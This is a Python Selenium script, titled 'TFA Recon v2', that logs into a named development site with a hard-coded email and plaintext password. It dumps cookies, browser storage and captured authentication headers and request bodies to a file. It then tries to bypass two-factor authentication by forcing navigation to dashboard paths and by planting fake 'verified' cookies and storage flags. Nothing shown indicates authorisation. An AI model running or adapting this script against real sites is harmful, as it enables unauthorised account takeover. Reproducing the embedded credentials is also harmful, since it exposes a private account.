"""
TFA Recon v2 - saves all output to recon_results.txt
"""
import time
import json
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service

BASE_URL = "https://dev.bindrocket.com"
EMAIL = "sam201td@gmail.com"
PASSWORD = "Shrabbi1234@#"
OUTPUT_FILE = "recon_results.txt"

lines = []
def p(msg):
    print(msg, flush=True)
    lines.append(msg)

def save():
    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))

def main():
    chrome_options = Options()
    chrome_options.add_argument("--start-maximized")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
    chrome_options.set_capability("goog:loggingPrefs", {"performance": "ALL"})
    service = Service(log_output=os.devnull)
    driver = webdriver.Chrome(options=chrome_options, service=service)

    try:
        # Step 1: Login
        p("=== STEP 1: LOGIN ===")
        driver.get(f"{BASE_URL}/login")
        time.sleep(3)
        driver.find_element(By.CSS_SELECTOR, "input[type='email'], input[placeholder*='email' i]").send_keys(EMAIL)
        driver.find_element(By.CSS_SELECTOR, "input[type='password']").send_keys(PASSWORD)
        time.sleep(1)
        driver.find_element(By.XPATH, "//button[contains(text(), 'Login')]").click()
        time.sleep(5)
        p(f"URL after login: {driver.current_url}")
        save()

        # Step 2: Dump cookies
        p("\n=== COOKIES ===")
        for c in driver.get_cookies():
            p(f"  {c['name']} = {c['value']}")
        save()

        # Step 3: Dump localStorage
        p("\n=== LOCAL STORAGE ===")
        ls_keys = driver.execute_script("return Object.keys(localStorage);")
        for k in ls_keys:
            val = driver.execute_script(f"return localStorage.getItem('{k}');")
            p(f"  {k} = {val}")
        save()

        # Step 4: Dump sessionStorage  
        p("\n=== SESSION STORAGE ===")
        ss_keys = driver.execute_script("return Object.keys(sessionStorage);")
        for k in ss_keys:
            val = driver.execute_script(f"return sessionStorage.getItem('{k}');")
            p(f"  {k} = {val}")
        save()

        # Step 5: Capture API calls from performance logs
        p("\n=== API CALLS (from performance logs) ===")
        logs = driver.get_log("performance")
        for entry in logs:
            try:
                log_data = json.loads(entry["message"])
                msg = log_data.get("message", {})
                method = msg.get("method", "")
                if method == "Network.requestWillBeSent":
                    req = msg.get("params", {}).get("request", {})
                    url = req.get("url", "")
                    http_method = req.get("method", "")
                    if any(kw in url.lower() for kw in ["api", "auth", "login", "verify", "two-factor", "token", "session", "graphql"]):
                        p(f"  {http_method} {url}")
                        post_data = req.get("postData", "")
                        if post_data:
                            p(f"    Body: {post_data[:500]}")
                        headers = req.get("headers", {})
                        for hk, hv in headers.items():
                            if any(x in hk.lower() for x in ["auth", "token", "cookie", "x-"]):
                                p(f"    {hk}: {hv[:200]}")
            except Exception:
                pass
        save()

        # Step 6: Try direct dashboard navigation while on TFA page
        p("\n=== BYPASS ATTEMPTS ===")
        test_paths = [
            "/portal/dashboard",
            "/portal",
            "/dashboard",
            "/home",
            "/forms",
            "/portal/forms",
            "/agent/dashboard",
            "/app",
            "/app/dashboard",
        ]
        for path in test_paths:
            url = f"{BASE_URL}{path}"
            driver.get(url)
            time.sleep(2)
            final_url = driver.current_url
            title = driver.title
            status = "SUCCESS" if ("login" not in final_url.lower() and "two-factor" not in final_url.lower() and "404" not in title.lower()) else "BLOCKED"
            p(f"  [{status}] {path} -> {final_url} (title: {title[:50]})")
        save()

        # Step 7: Try cookie/localStorage manipulation approach
        p("\n=== COOKIE MANIPULATION ===")
        # Re-login
        driver.get(f"{BASE_URL}/login")
        time.sleep(3)
        driver.find_element(By.CSS_SELECTOR, "input[type='email'], input[placeholder*='email' i]").send_keys(EMAIL)
        driver.find_element(By.CSS_SELECTOR, "input[type='password']").send_keys(PASSWORD)
        time.sleep(1)
        driver.find_element(By.XPATH, "//button[contains(text(), 'Login')]").click()
        time.sleep(5)
        p(f"Re-login URL: {driver.current_url}")

        # Set various TFA bypass cookies/storage
        bypass_keys = ["tfa_verified", "two_factor_verified", "2fa_verified", "verified", "tfa_complete", "mfa_verified"]
        for key in bypass_keys:
            try:
                driver.add_cookie({"name": key, "value": "true", "domain": "dev.bindrocket.com"})
            except Exception:
                pass
            driver.execute_script(f"localStorage.setItem('{key}', 'true');")
            driver.execute_script(f"sessionStorage.setItem('{key}', 'true');")
        
        # Also try setting isVerified in the existing token data
        driver.execute_script("localStorage.setItem('two_factor_verified', 'true');")
        
        # Try navigating to portal
        for path in ["/portal/dashboard", "/portal", "/forms"]:
            driver.get(f"{BASE_URL}{path}")
            time.sleep(2)
            final_url = driver.current_url
            title = driver.title
            status = "SUCCESS" if ("login" not in final_url.lower() and "two-factor" not in final_url.lower() and "404" not in title.lower()) else "BLOCKED"
            p(f"  After manipulation [{status}] {path} -> {final_url} ({title[:50]})")
        save()

        # Step 8: Try getting the page DOM while on TFA to look for hidden elements
        p("\n=== TFA PAGE DOM ANALYSIS ===")
        driver.get(f"{BASE_URL}/login")
        time.sleep(3)
        driver.find_element(By.CSS_SELECTOR, "input[type='email'], input[placeholder*='email' i]").send_keys(EMAIL)
        driver.find_element(By.CSS_SELECTOR, "input[type='password']").send_keys(PASSWORD)
        time.sleep(1)
        driver.find_element(By.XPATH, "//button[contains(text(), 'Login')]").click()
        time.sleep(5)
        
        # Get all elements on TFA page
        all_elements = driver.find_elements(By.XPATH, "//*")
        p(f"Total elements on TFA page: {len(all_elements)}")
        
        # Find the TFA form
        forms = driver.find_elements(By.TAG_NAME, "form")
        p(f"Forms found: {len(forms)}")
        for i, form in enumerate(forms):
            action = form.get_attribute("action") or ""
            method_attr = form.get_attribute("method") or ""
            p(f"  Form[{i}]: action={action} method={method_attr}")
            
        # Find all input fields
        inputs = driver.find_elements(By.TAG_NAME, "input")
        p(f"Input fields: {len(inputs)}")
        for i, inp in enumerate(inputs):
            p(f"  Input[{i}]: type={inp.get_attribute('type')} name={inp.get_attribute('name')} id={inp.get_attribute('id')} placeholder={inp.get_attribute('placeholder')}")

        # Find all buttons
        buttons = driver.find_elements(By.TAG_NAME, "button")
        p(f"Buttons: {len(buttons)}")
        for i, btn in enumerate(buttons):
            p(f"  Button[{i}]: text='{btn.text.strip()}' type={btn.get_attribute('type')}")

        # Find all links
        links = driver.find_elements(By.TAG_NAME, "a")
        p(f"Links: {len(links)}")
        for i, link in enumerate(links):
            p(f"  Link[{i}]: text='{link.text.strip()}' href={link.get_attribute('href')}")
        
        save()
        p("\n=== DONE ===")
        p(f"Results saved to {OUTPUT_FILE}")
        save()

    except Exception as e:
        p(f"\nERROR: {e}")
        import traceback
        p(traceback.format_exc())
        save()
    finally:
        driver.quit()

if __name__ == "__main__":
    main()
